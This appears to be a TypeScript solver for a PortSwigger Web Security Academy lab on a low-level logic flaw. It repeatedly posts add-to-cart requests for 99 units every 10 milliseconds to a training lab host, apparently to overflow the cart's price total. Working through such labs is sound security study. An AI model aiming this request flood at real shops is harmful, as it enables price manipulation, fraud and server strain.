/**
 * PortSwigger Lab: Low-level logic flaw
 * https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level
 */

import { Sess } from "../base"

const LABID = "0ab00021049c901a81e98080008c00b1"

const iter = async () => {
	return await Sess.req`
		POST /cart HTTP/2
		Host: ${LABID}.web-security-academy.net
		Cookie: session=xHPm1tBrXrqV8OowM4QgvD0AIg9qIIPP
		Content-Length: 37
		Cache-Control: max-age=0
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Mobile: ?0
		Sec-Ch-Ua-Platform: "macOS"
		Upgrade-Insecure-Requests: 1
		Origin: https://${LABID}.web-security-academy.net
		Content-Type: application/x-www-form-urlencoded
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.9
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: navigate
		Sec-Fetch-Dest: document
		Referer: https://${LABID}.web-security-academy.net/product?productId=1
		Accept-Encoding: gzip, deflate, br
		Connection: keep-alive

		productId=1&redir=PRODUCT&quantity=99
	`.then(r => r.status() === 302)
}

let i = 1
const loop = async () => {
	iter()
		.then(() => {
			console.log("ITERATION SUCCESS:", i++)
		})
		.catch(() => {
			console.log("ITERATION FAILURE:", i++)
		})

	setTimeout(loop, 10)
}

loop()
